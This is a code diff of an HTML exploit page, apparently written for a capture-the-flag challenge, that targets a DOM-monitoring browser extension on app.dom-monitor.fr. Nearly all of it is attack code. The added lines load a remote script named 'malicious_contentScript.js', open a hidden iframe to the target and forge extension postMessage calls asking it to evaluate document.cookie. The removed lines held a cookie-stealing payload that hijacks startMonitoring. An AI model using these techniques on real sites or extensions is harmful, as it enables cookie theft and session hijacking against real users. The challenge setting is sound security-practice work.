@@ -2,53 +2,52 @@
 <html>
 <head>
   <title>DOM Monitor Exploit</title>
+  <script>
+    // Create a controlled script element that will affect the baseURL calculation
+    const fakeScript = document.createElement('script');
+    // Set src to a URL that will make the extension load our malicious script instead of bundle.js
+    fakeScript.src = "https://vizpay-secure.github.io/vizpay/malicious_contentScript.js";
+    document.head.appendChild(fakeScript);
+
+    // Later we'll replace the normal bundle.js with our own version
+    window.addEventListener('load', function() {
+      // Our attack code
+      const targetDomain = "app.dom-monitor.fr";
+      
+      // Create an iframe to the target domain
+      const iframe = document.createElement('iframe');
+      iframe.src = "https://" + targetDomain;
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.border = "none";
+      document.body.appendChild(iframe);
+      
+      // Set up a listener for messages from our injected script
+      window.addEventListener('message', function(event) {
+        console.log("Detailed message:", JSON.stringify(event.data));
+        if (event.data && event.data.flagCookie) {
+          document.getElementById('result').textContent = "Flag: " + event.data.flagCookie;
+        }
+      });
+    });
+  </script>
 </head>
 <body>
   <div id="start">Click to start</div>
-  <iframe id="targetFrame" src="https://app.dom-monitor.fr" style="width:0;height:0;border:none;"></iframe>
+  <div id="result"></div>
   
+  <!-- Let's also create a helper script to try another attack vector -->
   <script>
-    // Function to handle the start button click
     document.getElementById('start').addEventListener('click', function() {
-      console.log("Starting exploit...");
+      console.log("Starting direct cookie exfiltration...");
       
-      // Step 1: Create a script that will extract cookies when injected
-      const cookieExtractorCode = `
-        // This will run in the context of app.dom-monitor.fr via the extension
-        // Override the window.postMessage to intercept cookie data
-        const originalStartMonitoring = window.startMonitoring;
-        window.startMonitoring = function() {
-          // Get the cookie we want
-          const cookies = document.cookie;
-          console.log("Cookies found:", cookies);
-          
-          // Send it back via the extension's messaging
-          window.postMessage({
-            action: "update_counts",
-            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
-            stolenCookie: cookies  // Add the cookie as an extra property
-          }, "*");
-          
-          return originalStartMonitoring.apply(this, arguments);
-        };
-      `;
-      
-      // Step 2: Try to inject our code via various methods that might execute in the iframe
-      // Since CSP is removed, we can try script injection
-      const scriptElem = document.createElement('script');
-      scriptElem.textContent = cookieExtractorCode;
-      document.body.appendChild(scriptElem);
-      
-      // Step 3: Set up a listener to receive the data
-      window.addEventListener("message", function(message) {
-        console.log("Message received:", message.data);
-        if (message.data && message.data.stolenCookie) {
-          console.log("SUCCESS! Cookie data:", message.data.stolenCookie);
-          // Display the cookie for the challenge
-          document.body.innerHTML = `<h1>Flag found: ${message.data.stolenCookie}</h1>`;
-        }
-      });
+      // Try to use postMessage directly to communicate with the extension
+      window.postMessage({
+        action: "update_counts",
+        counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+        resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
+        command: "document.cookie",  // Ask the extension to evaluate this
+      }, "*");
     });
   </script>
 </body>
